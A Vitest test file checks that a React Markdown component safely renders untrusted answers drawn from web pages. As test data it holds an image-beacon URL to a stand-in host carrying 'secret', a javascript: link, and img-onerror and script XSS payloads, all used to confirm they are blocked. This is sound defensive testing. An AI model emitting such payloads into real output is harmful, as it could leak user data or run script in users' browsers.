import { describe, expect, it } from 'vitest'
import { render, screen } from '@testing-library/react'
import Markdown from '@/components/Markdown'

const nl = String.fromCharCode(10)
const lines = (...l: string[]) => l.join(nl)

describe('Markdown (an answer is untrusted text that came from web pages)', () => {
  it('renders the usual formatting', () => {
    const { container } = render(<Markdown text={lines('## Title', '', 'some **bold** text', '', '- one', '- two')} />)
    expect(screen.getByRole('heading', { name: 'Title' })).toBeInTheDocument()
    expect(container.querySelector('strong')).toHaveTextContent('bold')
    expect(container.querySelectorAll('li')).toHaveLength(2)
  })

  it('renders tables', () => {
    const { container } = render(<Markdown text={lines('| a | b |', '|---|---|', '| 1 | 2 |')} />)
    expect(container.querySelectorAll('th')).toHaveLength(2)
    expect(container.querySelector('td')).toHaveTextContent('1')
  })

  it('never loads an image (a hostile page could use one to leak data)', () => {
    const { container } = render(<Markdown text="![x](https://evil.test/p.gif?d=secret)" />)
    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('[image: x')
  })

  it('drops javascript: links', () => {
    const { container } = render(<Markdown text="[bad](javascript:alert(1))" />)
    const a = container.querySelector('a')
    expect(a?.getAttribute('href') ?? '').not.toMatch(/javascript/i)
  })

  it('shows raw HTML as text instead of running it', () => {
    const { container } = render(<Markdown text="<img src=x onerror=alert(1)> <script>alert(1)</script>" />)
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container).toHaveTextContent('<img src=x onerror=alert(1)>')
  })

  it('opens links in a new tab without a handle back to this app', () => {
    const { container } = render(<Markdown text="[ok](https://example.com)" />)
    const a = container.querySelector('a')!
    expect(a).toHaveAttribute('target', '_blank')
    expect(a.getAttribute('rel')).toMatch(/noopener/)
    expect(a.getAttribute('rel')).toMatch(/noreferrer/)
  })

  it('pretty-prints a JSON answer as a code block with a copy button', () => {
    const { container } = render(<Markdown text={'{"a":1,"b":[2]}'} />)
    expect(container.querySelector('pre')?.textContent).toContain(nl + '  "a": 1')
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeInTheDocument()
  })

  it('leaves text that merely starts with a brace alone', () => {
    const { container } = render(<Markdown text="{not json at all" />)
    expect(container.querySelector('pre')).toBeNull()
  })
})
